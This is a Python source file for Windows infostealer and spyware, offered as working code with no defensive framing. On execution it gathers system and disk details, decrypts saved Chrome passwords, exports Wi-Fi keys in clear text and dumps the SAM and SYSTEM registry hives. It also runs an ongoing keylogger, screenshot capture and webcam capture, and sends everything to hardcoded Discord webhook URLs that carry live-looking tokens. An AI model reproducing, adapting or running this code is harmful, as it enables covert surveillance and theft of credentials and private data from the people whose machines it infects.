from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
from datetime import datetime
from uuid import getnode as get_mac
from time import sleep
from pynput.keyboard import Listener, Key
from Cryptodome.Cipher import AES
import pygetwindow as gw
import cv2
import pyautogui
import socket
import platform
import requests
import subprocess
import psutil
import getpass
import shutil
import ctypes
import logging
import sqlite3
import base64
import win32crypt
import os
import json
import threading


def capture_and_send_image(webhook_url):
    while True:
        webcam = cv2.VideoCapture(0)
        sleep(2)

        check, frame = webcam.read()
        cv2.imwrite("captured_image.jpg", frame)

        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(
            title="Captured Image", description="Image from webcam", color=0x3498DB
        )

        with open("captured_image.jpg", "rb") as f:
            embed.set_image(url="attachment://captured_image.jpg")
            webhook.add_file(file=f.read(), filename="captured_image.jpg")
        webhook.add_embed(embed)
        webhook.execute()
        key = cv2.waitKey(1)


def send_system_info_to_discord(webhook_url):
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    public_ip = get("https://api.ipify.org").text
    os_info = platform.uname()
    username = getpass.getuser()
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    mac = ":".join(("%012X" % get_mac())[i : i + 2] for i in range(0, 12, 2))

    message = (
        f"**Public IP Address:** {public_ip}\n"
        f"\n**Private IP Address:** {IPAddr}\n"
        f"\n**Hostname:** {hostname}\n"
        f"\n**System:** {os_info}\n"
        f"\n**Username:** {username}\n"
        f"\n**MAC:** {mac}\n"
        f"\n**Boot time:** {boot_time}\n"
    )

    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title="System Information", description=message, color=0x3498DB)
    webhook.add_embed(embed)
    webhook.execute()


def send_disk_info_to_discord(webhook_url):
    partitions = psutil.disk_partitions()
    disk_info = ""
    for partition in partitions:
        disk_mountpoint = partition.mountpoint
        disk_usage = shutil.disk_usage(disk_mountpoint)
        total_size_gb = disk_usage.total // (2**30)
        free_size_gb = disk_usage.free // (2**30)
        used_size_gb = disk_usage.used // (2**30)
        used_percent = (disk_usage.used / disk_usage.total) * 100
        disk_info += (
            f"**Disk Mountpoint:** {disk_mountpoint}\n"
            f"**Total Size:** {total_size_gb} GB\n"
            f"**Free Size:** {free_size_gb} GB\n"
            f"**Used Size:** {used_size_gb} GB\n"
            f"**Used Percent:** {used_percent:.2f}%\n\n"
        )
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title="Disk Information", description=disk_info, color=0x3498DB)
    webhook.add_embed(embed)
    webhook.execute()


def capture_and_send_screenshot(webhook_url):
    while True:
        username = getpass.getuser()
        active_window_title = gw.getWindowsWithTitle(gw.getActiveWindow().title)[0].title
        image = pyautogui.screenshot()
        image_path = "screenshot.png"
        image.save(image_path)

        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(
            title="Screenshot",
            description=f"Active Window: {active_window_title}",
            color=0x3498DB,
        )
        embed.set_footer(text=f"Captured by {username}")
        embed.set_image(url="attachment://screenshot.png")
        webhook.add_file(file=open(image_path, "rb"), filename="screenshot.png")
        webhook.add_embed(embed)
        webhook.execute()


def send_keyboard_logs_to_discord(webhook_url):
    log_dir = os.getcwd()
    logging.basicConfig(
        filename=(log_dir + "keylogs.txt"),
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s",
    )

    def on_release(key):
        la_lettre = format(key)
        lefichier = open("test.txt", "a")
        if len(la_lettre) == 3:
            la_lettre = la_lettre[1]
        logging.info(la_lettre)
        if la_lettre == "Key.space":
            lefichier.write("  ")
        elif la_lettre == "Key.backspace":
            lefichier.close()
            lefichier = open("test.txt", "r")
            phrase = lefichier.read()
            if len(phrase) != 0:
                phrase = phrase[:-1]
            lefichier.close()
            lefichier = open("test.txt", "w")
            lefichier.write(phrase)
        elif la_lettre == "Key.enter":
            lefichier.close()
            lefichier = open("test.txt", "r")
            embed = DiscordEmbed(title="KeyLoger :", description=lefichier.read(), color="ff0000")
            webhook = DiscordWebhook(url=webhook_url)
            webhook.add_embed(embed)
            response = webhook.execute()
            lefichier.close()
            lefichier = open("test.txt", "w")
        elif la_lettre == "Key.cmd":
            lefichier.write(" |Win| ")
        elif la_lettre == "Key.shift":
            lefichier.write(" |ShiftRelache| ")
        elif la_lettre == "Key.ctrl_l":
            lefichier.write(" |Ctrl| ")
        elif la_lettre == "Key.tab":
            lefichier.write(" |Tab| ")
        elif la_lettre == "Key.caps_lock":
            lefichier.write(" |Maj| ")
        elif la_lettre == " Key.alt_l":
            lefichier.write(" |Alt| ")
        else:
            lefichier.write(la_lettre)

    with Listener(on_release=on_release) as file:
        file.join()


def send_chrome_passwords_to_discord(webhook_url):
    def closeChrome():
        try:
            os.system("taskkill /f /im chrome.exe")
        except:
            pass

    def getSecretKey():
        try:
            with open(
                os.path.normpath(
                    r"%s\AppData\Local\Google\Chrome\User Data\Local State"
                    % (os.environ["USERPROFILE"])
                ),
                "r",
                encoding="utf-8",
            ) as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("Secret key not found")

    def decryptPayload(cipher, payload):
        return cipher.decrypt(payload)

    def generateCipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decryptPassword(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generateCipher(secret_key, initialisation_vector)
            decrypted_pass = decryptPayload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except:
            print("Cannot decrypt password")

    def getChromePasswords():
        data_path = (
            os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        )
        c = sqlite3.connect(data_path)
        cursor = c.cursor()
        select_statement = "SELECT origin_url, username_value, password_value FROM logins"
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        extractedData = []
        for userdatacombo in login_data:
            if (
                userdatacombo[1] != None
                and userdatacombo[2] != None
                and userdatacombo[1] != ""
                and userdatacombo[2] != ""
            ):
                password = decryptPassword(userdatacombo[2], getSecretKey())
                data = f"**URL:** {userdatacombo[0]}\n**Username:** {userdatacombo[1]}\n**Password:** {str(password)}\n\n---\n"
                extractedData.append(data)
            else:
                pass
        return extractedData

    def savePasswords(data):
        with open("passwords.txt", "w") as f:
            for line in data:
                f.write(line + "\n")

    def sendToDiscord(data):
        embed = {
            "embeds": [
                {
                    "title": "__Chrome Passwords__",
                    "description": "\n".join(data),
                    "color": 16711680,
                }
            ]
        }
        requests.post(webhook_url, json=embed)

    closeChrome()
    data = getChromePasswords()
    savePasswords(data)
    sendToDiscord(data)


def send_wifi_passwords_to_discord(webhook_url):
    with open("passwords.txt", "w") as f:
        f.write("Available Wi-Fi credentials on the machine:\n")
        f.close()
    command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True, text=True).stdout
    path = os.getcwd()
    wifi_files = []
    for filename in os.listdir(path):
        if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
            wifi_files.append(filename)
    for i in wifi_files:
        with open(i, "r") as f:
            name_counter = 0
            wifi_name = ""
            wifi_password = ""
            creds = []
            for line in f.readlines():
                if "name" in line and name_counter == 0:
                    name_counter += 1
                    stripped = line.strip()
                    front = stripped[6:]
                    back = front[:-7]
                    wifi_name = back
                if "keyMaterial" in line:
                    stripped = line.strip()
                    front = stripped[13:]
                    back = front[:-14]
                    wifi_password = back
        if wifi_password == "":
            wifi_password = "none"
        creds = [wifi_name, wifi_password]
        with open("passwords.txt", "a") as f:
            f.write("\n[*] SSID: " + creds[0] + "\n" + "[!] Password: " + creds[1] + "\n")
            f.close()
    for i in wifi_files:
        os.remove(i)
    with open("passwords.txt", "r") as f:
        password_message = f.read()
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title="Wi-Fi Passwords", description=password_message, color=0x3498DB)
    webhook.add_embed(embed)
    webhook.execute()


def send_registry_files_to_discord(webhook_url):
    subprocess.run(["reg", "save", "HKLM\SAM", r"C:\sam"], shell=True)
    subprocess.run(["reg", "save", "HKLM\SYSTEM", r"C:\system"], shell=True)
    files = [
        ("file1", ("sam", open("C:/sam", "rb"))),
        ("file2", ("system", open("C:/system", "rb"))),
    ]
    data = {"content": "Here are the files you requested."}
    try:
        response = requests.post(webhook_url, data=data, files=files)
        response.raise_for_status()
        print("Files successfully sent to Discord.")
    except requests.exceptions.RequestException as err:
        print(f"Error sending files to Discord: {err}")
    finally:
        for _, file_data in files:
            file_data[1].close()


image_webhook_url = "https://discord.com/api/webhooks/1181579952865419314/7uGEy040yuo8jukOzt5CJXlNo6k8a9VrmgeNaLGPp9RaiqHgQcsr0y7ouSDwmWFIH8Ez"
system_info_webhook_url = "https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q"
disk_info_webhook_url = "https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q"
screenshot_webhook_url = "https://discord.com/api/webhooks/1181250956294365235/dTgbhtiAO2RID6vmWpuf88I3XnIkD17FgY19gRMKWXo71cOU-gQcEJgRVGbCCLvGA_fy"
keyboard_logs_webhook_url = "https://discord.com/api/webhooks/1214868505170808902/jVQu4B7zxjVW0VJY3ehmWGQU7EQHCJjkU9VohMZi2GPX4qFfgWL1YgfK1GO9h5M-0mv4"
chrome_passwords_webhook_url = "https://discord.com/api/webhooks/1186957152888295474/GxNMCIjSd6_mCKcFx9CWHBj4eXn-KiWZWmHan1bPKEPgQMA5JoMIUrEfsgjlSdBqYjPl"
wifi_passwords_webhook_url = "https://discord.com/api/webhooks/1214868844070572072/MU0SiSRJyDTWd41MmeU67-T2A7dFihCORmgbNfhLTWj-4mUl5jPDw1qZVdz6OORO_3yv"
registry_files_webhook_url = "https://discord.com/api/webhooks/1186985816254316574/pEkFuwOfHZ_cKTFglI8QXZLedEfwaF9FleoiagqpKVTvqxyg7myl3lQu2apzO7sdHp8h"


send_system_info_to_discord(system_info_webhook_url)
send_disk_info_to_discord(disk_info_webhook_url)
send_chrome_passwords_to_discord(chrome_passwords_webhook_url)
send_wifi_passwords_to_discord(wifi_passwords_webhook_url)
send_registry_files_to_discord(registry_files_webhook_url)
threading.Thread(target=send_keyboard_logs_to_discord, args=(keyboard_logs_webhook_url,)).start()
threading.Thread(target=capture_and_send_screenshot, args=(screenshot_webhook_url,)).start()
threading.Thread(target=capture_and_send_image, args=(image_webhook_url,)).start()
